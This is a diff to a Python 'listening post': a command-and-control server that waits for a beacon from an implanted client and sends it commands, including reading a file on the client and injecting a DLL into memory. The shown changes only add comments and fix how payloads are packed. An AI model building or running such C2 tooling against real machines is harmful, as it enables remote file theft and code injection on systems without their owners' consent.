@@ -33,10 +33,12 @@ MAX_FILE_SIZE = 0xFFFFFFFF
 
 print("***** Python .dll listening post *****\n")
 print("Starting the listening post. . . \n")
+# Create a socket that we will listen on
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # Stop the socket from complaing about address alredy in use
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+# Bind and listen on host address
 s.bind(('10.1.20.40', SERVER_PORT))
 s.listen(1)
 print("Server started.\n")
@@ -47,8 +49,8 @@ print("Please wait while we receive a beacon from the client. . .\n")
 # Wait for connect
 conn, addr = s.accept()
 print("Got connection from: ", addr)
-# Get data
 
+# Get data
 data = conn.recv(BUFFER_SIZE)
 # If we get empty ACK then break
 if not data:
@@ -69,9 +71,9 @@ else:
 # want to interact, or even send commands to multiple clients at once
 while True:
 	print("Please select a command to send to ", addr)
-	print("(0) Quit\n(1) Do Something\n(2) Do Something Else \
+	print("(0) Quit\n(1) Do Something\n(2) Read a file \
 		\n(3) Do another thing\n(4) Memory Inject DLL\n")
-
+	# Get user input, store it in choice
 	choice = input(">>> ").rstrip()
 
 	# If choice isn't a positive number
@@ -96,7 +98,7 @@ while True:
 		# We choose option 1
 		elif user_input == 1:
 			# Simple payload to echo back "sartoris"
-			TYPE1_PAYLOAD = pack('<i', TYPE1)
+			TYPE1_PAYLOAD = pack('i', TYPE1)
 			TYPE1_PAYLOAD += pack('i', 8)
 			TYPE1_PAYLOAD += pack('8s', b'sartoris')
 			print("Sending payload of type1: ", TYPE1_PAYLOAD)
@@ -114,12 +116,13 @@ while True:
 			file_length = len(file2read)
 
 			# Pack the message type
-			TYPE2_PAYLOAD = pack('<i', TYPE2)
+			TYPE2_PAYLOAD = pack('i', TYPE2)
 			# Pack the length of the string: the file we want to read
 			TYPE2_PAYLOAD += pack('i', file_length)
 			# Pack each byte of the string
-			for c in file2read:
-				TYPE2_PAYLOAD += pack('c', c)
+			file2read.encode('ascii')
+			for c in bytes(file2read, 'ascii'):
+				TYPE2_PAYLOAD += pack('c', bytes([c]))
 			# Send the message
 			conn.send(TYPE2_PAYLOAD)
 			# See if client responds
@@ -130,7 +133,7 @@ while True:
 		# We choose option 3	
 		elif user_input == 3:
 			print("Got choice 3")
-			TYPE3_PAYLOAD = pack('<i', TYPE3)
+			TYPE3_PAYLOAD = pack('i', TYPE3)
 			TYPE3_PAYLOAD += pack('i', 8)
 			TYPE3_PAYLOAD += pack('8s', b'sartoris')
 			conn.send(TYPE3_PAYLOAD)
@@ -160,7 +163,6 @@ while True:
 			# >i for length gives mem access error
 			# i and <i for length gives no feedback, and no crash
 			packed_data += pack('>i', length)
-			file_data = b''
 
 			try:
 				byte = f.read(1)
